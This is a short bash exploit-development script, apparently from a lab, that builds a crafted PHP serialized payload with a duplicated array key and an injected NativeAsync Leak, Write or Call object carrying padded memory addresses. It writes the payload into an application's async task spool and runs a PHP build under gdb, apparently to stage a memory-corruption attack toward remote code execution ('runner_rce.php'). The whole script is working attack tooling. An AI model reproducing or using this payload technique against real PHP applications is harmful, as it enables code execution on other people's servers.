#!/bin/bash
# Direct stage test with shape-identical payloads (64-char padded addr).
# $1 = Leak|Write|Call, $2 = chunk, $3 = base, $4 = d, $5 = dtor, $6 = base-count
LAB=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab
PHP=/tmp/php8512_build/plain2/sapi/cli/php
SPOOL="$LAB/storage/framework/async/payload"
STAGE=${1:-Leak}
CHUNK=${2:-0}; BASEADDR=${3:-0}; D=${4:-0}; DTOR=${5:-0}
BASE=${6:-1017}
CLS="NativeAsync$STAGE"
TASK="nphp-test--0000000000000000000001"

PAD=$(python3 -c "print('|'.join(f'{int(v):015d}' for v in '$CHUNK $BASEADDR $D $DTOR'.split()))")
echo "addr=$PAD"

python3 - "$BASE" "$CLS" "$PAD" <<'PYEOF' > /tmp/stage_payload.txt
import sys
base, cls, addr = sys.argv[1], sys.argv[2], sys.argv[3]
els = [f"i:{k};i:1;" for k in range(int(base))]
els.append(f'i:9998;O:{len(cls)}:"{cls}":1:{{s:4:"addr";s:{len(addr)}:"{addr}";}}')
els.append("i:9998;i:5;")
sys.stdout.write(f"a:{int(base) + 2}:{{" + "".join(els) + "}")
PYEOF
cp /tmp/stage_payload.txt "$SPOOL/$TASK.task"
echo "payload=$(wc -c < /tmp/stage_payload.txt)"

timeout 90 env NATIVEPHP_TASK_ID=$TASK gdb -q -batch \
  -ex "set pagination off" -ex "set confirm off" -ex "set auto-load safe-path /" \
  -ex "run -n $LAB/runner_rce.php" \
  "$PHP" 2>&1 | grep -vE "^warning|auto-load|^\[|To enable|To completely|line to your|For more|info \"|Auto-loading|libthread" | tail -24
